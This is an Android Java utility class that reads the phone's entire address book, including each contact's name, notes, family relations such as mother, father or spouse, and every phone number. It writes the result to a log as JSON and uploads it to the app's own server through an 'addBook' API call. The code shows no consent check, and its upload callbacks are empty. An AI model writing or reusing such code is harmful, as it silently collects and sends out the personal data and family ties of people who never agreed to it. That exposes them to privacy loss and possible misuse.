package com.magic.moly.dai.util;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.text.TextUtils;

import com.google.gson.Gson;
import com.magic.moly.dai.base.BaseActivity;
import com.magic.moly.dai.util.network.NetWorkApi;
import com.magic.moly.dai.util.network.NetworkUtil;

import java.util.ArrayList;
import java.util.List;

/**
 * Created by guilin on 2019/4/19 09:52.
 * email 973635949@qq.com
 * 获取联系人列表的工具类
 */
public class GetConnactsUtil {

    public static void getContacts(BaseActivity baseActivity) {

        List<ContactData> resultList = new ArrayList<>();
        Uri uri = ContactsContract.Contacts.CONTENT_URI;
        String[] projection = new String[]{ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME};
        Cursor cursor = baseActivity.getContentResolver().query(uri, projection, null, null, null);
        while (cursor != null && cursor.moveToNext()) {
            try {
                long id = cursor.getLong(0);
                String name = cursor.getString(1);
                if (TextUtils.isEmpty(name)) {
                    continue;
                }
                ContactData data = new ContactData(name);
                //获取备注
                data.setDictClass(getRemark(baseActivity, id));
                //获取关系
                data.setDictRelationList(getRelation(baseActivity, id));
                //获取电话号码
                data.setDictNumberList(getPhone(baseActivity, id));

                resultList.add(data);
            } catch (Exception e) {
                LL.i(e.toString());
            }
        }
        if (cursor != null) {
            cursor.close();
        }
        String str = new Gson().toJson(resultList);
        LL.i(str);
        baseActivity.send(NetWorkApi.getApi().addBook(resultList), new NetworkUtil.OnNetworkResponseListener<Object>() {
            @Override
            public void onSuccess(Object data) {

            }

            @Override
            public void onFail(int code, String message) {

            }
        });
    }

    private static List<ContactData.RelationData> getRelation(Context context, long id) {
        List<ContactData.RelationData> list = new ArrayList<>();
        Cursor remarkCursor = context.getContentResolver().query(
                ContactsContract.Data.CONTENT_URI,
                null,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=? and " + ContactsContract.Data.MIMETYPE + "=?",
                new String[]{id + "", ContactsContract.CommonDataKinds.Relation.CONTENT_ITEM_TYPE},
                null);
        if (remarkCursor != null && remarkCursor.moveToFirst()) {
            do {
                String value = remarkCursor.getString(remarkCursor.getColumnIndex(ContactsContract.CommonDataKinds.Relation.NAME));
                String type;
                switch (remarkCursor.getInt(remarkCursor.getColumnIndex(ContactsContract.CommonDataKinds.Relation.TYPE))) {
                    case ContactsContract.CommonDataKinds.Relation.TYPE_ASSISTANT:
                        type = "助理";
                        break;
                    case ContactsContract.CommonDataKinds.Relation.TYPE_BROTHER:
                        type = "兄弟";
                        break;
                    case ContactsContract.CommonDataKinds.Relation.TYPE_CHILD:
                        type = "子女";
                        break;
                    case ContactsContract.CommonDataKinds.Relation.TYPE_DOMESTIC_PARTNER:
                        type = "同居伴侣";
                        break;
                    case ContactsContract.CommonDataKinds.Relation.TYPE_FATHER:
                        type = "父亲";
                        break;
                    case ContactsContract.CommonDataKinds.Relation.TYPE_FRIEND:
                        type = "朋友";
                        break;
                    case ContactsContract.CommonDataKinds.Relation.TYPE_MANAGER:
                        type = "经理";
                        break;
                    case ContactsContract.CommonDataKinds.Relation.TYPE_MOTHER:
                        type = "母亲";
                        break;
                    case ContactsContract.CommonDataKinds.Relation.TYPE_PARENT:
                        type = "父母";
                        break;
                    case ContactsContract.CommonDataKinds.Relation.TYPE_PARTNER:
                        type = "合作伙伴";
                        break;
                    case ContactsContract.CommonDataKinds.Relation.TYPE_REFERRED_BY:
                        type = "介绍人";
                        break;
                    case ContactsContract.CommonDataKinds.Relation.TYPE_RELATIVE:
                        type = "亲属";
                        break;
                    case ContactsContract.CommonDataKinds.Relation.TYPE_SISTER:
                        type = "姐妹";
                        break;
                    case ContactsContract.CommonDataKinds.Relation.TYPE_SPOUSE:
                        type = "配偶";
                        break;
                    default:
                        type = "其他";
                        break;
                }
                list.add(new ContactData.RelationData(type, value));
            } while (remarkCursor.moveToNext());
            remarkCursor.close();
        }
        return list;
    }


    private static List<ContactData.PhoneData> getPhone(Context context, long id) {
        List<ContactData.PhoneData> list = new ArrayList<>();
        Cursor phonesCusor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + id,
                null,
                null);

        //因为每个联系人可能有多个电话号码，所以需要遍历
        if (phonesCusor != null && phonesCusor.moveToFirst()) {
            do {
                String phoneNumber = phonesCusor.getString(phonesCusor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)).replaceAll(" ", "").replaceAll("-", "");
                String phoneType;

                switch (phonesCusor.getInt(phonesCusor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE))) {
                    case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
                        phoneType = "住宅";
                        break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
                        phoneType = "手机";
                        break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
                        phoneType = "单位";
                        break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK:
                        phoneType = "单位传真";
                        break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME:
                        phoneType = "住宅传真";
                        break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_PAGER:
                        phoneType = "寻呼机";
                        break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER:
                        phoneType = "其他";
                        break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_CALLBACK:
                        phoneType = "8";
                        break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_CAR:
                        phoneType = "9";
                        break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_COMPANY_MAIN:
                        phoneType = "10";
                        break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_ISDN:
                        phoneType = "11";
                        break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_MAIN:
                        phoneType = "12";
                        break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER_FAX:
                        phoneType = "13";
                        break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_RADIO:
                        phoneType = "14";
                        break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_TELEX:
                        phoneType = "15";
                        break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_TTY_TDD:
                        phoneType = "16";
                        break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_WORK_MOBILE:
                        phoneType = "17";
                        break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_WORK_PAGER:
                        phoneType = "18";
                        break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_ASSISTANT:
                        phoneType = "19";
                        break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_MMS:
                        phoneType = "20";
                        break;
                    default:
                        phoneType = "自定义";
                        break;
                }
                list.add(new ContactData.PhoneData(phoneNumber, phoneType));

            } while (phonesCusor.moveToNext());
            phonesCusor.close();
        }
        return list;
    }


    private static String getRemark(Context context, long id) {
        Cursor remarkCursor = context.getContentResolver().query(
                ContactsContract.Data.CONTENT_URI,
                null,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=? and " + ContactsContract.Data.MIMETYPE + "=?",
                new String[]{id + "", ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE},
                null);
        if (remarkCursor != null && remarkCursor.moveToFirst()) {
            String s = remarkCursor.getString(remarkCursor.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
            remarkCursor.close();
            return s;
        } else {
            return "";
        }
    }


    public static class ContactData {

        /**
         * 联系人关系
         */
        private List<RelationData> dictRelationList;
        /**
         * 联系人姓名
         */
        private String dictName;
        /**
         * 联系人号码
         */
        private List<PhoneData> dictNumberList;
        /**
         * 联系人备注
         */
        private String dictClass = "";

        ContactData(String dictName) {
            this.dictName = dictName;
        }

        public List<RelationData> getDictRelationList() {
            return dictRelationList;
        }

        public void setDictRelationList(List<RelationData> dictRelationList) {
            this.dictRelationList = dictRelationList;
        }

        public List<PhoneData> getDictNumberList() {
            return dictNumberList;
        }

        public void setDictNumberList(List<PhoneData> dictNumberList) {
            this.dictNumberList = dictNumberList;
        }

        public String getDictClass() {
            return dictClass;
        }

        public void setDictClass(String dictClass) {
            this.dictClass = dictClass;
        }

        public static class RelationData {
            private String type;
            private String value;

            public RelationData(String type, String value) {
                this.type = type;
                this.value = value;
            }
        }

        static class PhoneData {
            private String dictNumber;
            private String type;

            PhoneData(String dictNumber, String type) {
                this.dictNumber = dictNumber;
                this.type = type;
            }

        }
    }
}
